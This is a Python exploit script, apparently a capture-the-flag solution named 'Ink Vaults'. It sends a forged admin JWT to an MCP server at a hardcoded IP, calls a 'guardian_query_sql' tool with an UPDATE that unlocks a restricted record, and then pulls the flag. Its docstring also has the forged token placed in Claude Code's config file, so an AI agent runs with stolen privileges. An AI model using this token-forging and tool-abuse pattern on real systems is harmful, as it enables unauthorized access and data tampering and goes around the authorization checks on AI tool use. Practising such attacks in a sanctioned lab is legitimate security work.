#!/usr/bin/env python3
"""
Ink Vaults Final Exploit
Updated to use admin JWT token for guardian authentication

This script should be run AFTER updating ~/.claude.json with the admin token
and restarting Claude Code.
"""

import requests
import json

# Configuration
MCP_URL = "http://154.57.164.77:30826/mcp"
ADMIN_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImVtYWlsIjoidGVzdEB0ZXN0LmNvbSIsImlhdCI6MTc2MzY3MzU3OCwiZXhwIjoxNzYzNjc3MTc4LCJqdGkiOiJmb3JnZWQtYWRtaW4tdG9rZW4tMDAxIn0.8BP6OaQSuOOKO0HMv4wAhwR8_22kfL7f6FKzVISxYgk"

def call_guardian_update():
    """Call guardian_query_sql to unlock scroll 7"""
    print("=" * 60)
    print("Calling guardian_query_sql with UPDATE command...")
    print("=" * 60)

    payload = {
        "jsonrpc": "2.0",
        "method": "tools/call",
        "params": {
            "name": "guardian_query_sql",
            "arguments": {
                "query": "UPDATE scrolls SET scroll_availability = 'Available' WHERE id = 7"
            }
        },
        "id": 1
    }

    try:
        response = requests.post(
            MCP_URL,
            json=payload,
            headers={
                "Content-Type": "application/json",
                "Accept": "application/json, text/event-stream",
                "Authorization": f"Bearer {ADMIN_TOKEN}"
            }
        )

        result = response.json()
        print(f"Response: {json.dumps(result, indent=2)}")

        # Check if successful
        if "result" in result:
            print("\n‚úì UPDATE query executed successfully!")
            return True
        else:
            print(f"\n‚úó Failed: {result}")
            return False

    except Exception as e:
        print(f"Error: {e}")
        return False

def query_scroll_7():
    """Query scroll 7 to retrieve the flag"""
    print("\n" + "=" * 60)
    print("Querying scroll 7 to retrieve flag...")
    print("=" * 60)

    try:
        response = requests.get("http://154.57.164.77:30826/api/scrolls")
        scrolls = response.json()

        for scroll in scrolls:
            if scroll["id"] == 7:
                print(f"Scroll 7: {json.dumps(scroll, indent=2)}")
                if "flag" in scroll and scroll["flag"]:
                    print(f"\nüèÅ FLAG FOUND: {scroll['flag']}")
                    return scroll["flag"]
                else:
                    print("\n‚ö† Flag not present in response")
                    return None

        print("\n‚úó Scroll 7 not found")
        return None

    except Exception as e:
        print(f"Error querying scrolls: {e}")
        return None

def main():
    """Main exploitation flow"""
    print("Ink Vaults - Final Exploit")
    print("Using admin token for guardian authentication")
    print(f"Target: {MCP_URL}")
    print()

    # Step 1: Execute UPDATE query
    success = call_guardian_update()

    if not success:
        print("\n‚úó Exploit failed at UPDATE step")
        return False

    # Step 2: Query for flag
    print("\nWaiting 2 seconds for database update to propagate...")
    import time
    time.sleep(2)

    flag = query_scroll_7()

    if flag:
        print(f"\n{'=' * 60}")
        print("EXPLOIT SUCCESSFUL!")
        print(f"Flag: {flag}")
        print(f"{'=' * 60}")
        return True
    else:
        print("\n‚úó Exploit failed - flag not retrieved")
        return False

if __name__ == "__main__":
    success = main()
    exit(0 if success else 1)
